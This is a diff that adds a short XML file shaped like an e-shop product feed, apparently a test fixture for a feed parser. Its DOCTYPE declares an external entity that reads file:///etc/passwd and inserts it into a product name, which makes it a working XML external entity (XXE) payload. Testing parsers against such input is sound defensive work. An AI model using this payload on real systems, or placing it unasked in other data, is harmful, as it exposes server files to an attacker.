@@ -1,0 +1,11 @@
+<?xml version="1.0" encoding="utf-8"?>
+<!DOCTYPE SHOP [
+  <!ENTITY secret SYSTEM "file:///etc/passwd">
+]>
+<SHOP>
+  <SHOPITEM>
+    <ITEM_ID>PEA-186</ITEM_ID>
+    <PRODUCTNAME>&secret;</PRODUCTNAME>
+    <PRICE_VAT>40.54</PRICE_VAT>
+  </SHOPITEM>
+</SHOP>
